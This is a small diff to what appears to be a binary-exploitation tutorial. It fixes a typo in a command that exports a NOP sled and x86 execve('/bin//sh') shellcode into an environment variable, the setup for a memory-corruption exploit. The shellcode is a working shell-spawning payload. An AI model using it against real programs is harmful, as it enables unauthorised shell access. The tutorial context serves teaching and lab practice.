@@ -7,7 +7,7 @@ we will put a shellcode (assembly instructions in hex format, the kind used by a
 shellcode found on https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/.
 
 ```
-export code=$(python -c "print('\x90'*8 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80')")`
+export code=$(python -c "print('\x90'*8 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80')")
 ```
 
 and simple C program to get the address of the environment variable:
